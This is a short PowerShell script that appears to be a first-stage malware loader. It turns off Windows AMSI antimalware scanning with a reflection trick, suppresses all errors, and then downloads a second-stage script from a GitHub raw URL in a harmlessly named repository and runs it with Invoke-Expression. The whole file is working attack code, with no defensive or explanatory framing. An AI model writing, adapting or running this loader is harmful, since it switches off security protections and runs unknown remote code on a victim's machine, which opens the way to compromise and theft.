$ErrorActionPreference = 'SilentlyContinue'

# === LIGHTWEIGHT AMSI BYPASS ===
try {
    $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
} catch {}

# === DOWNLOAD AND EXECUTE OBFUSCATED PAYLOAD ===
$payloadUrl = 'https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/stage2.ps1'
try {
    $script = (New-Object Net.WebClient).DownloadString($payloadUrl)
    Invoke-Expression $script
} catch {}
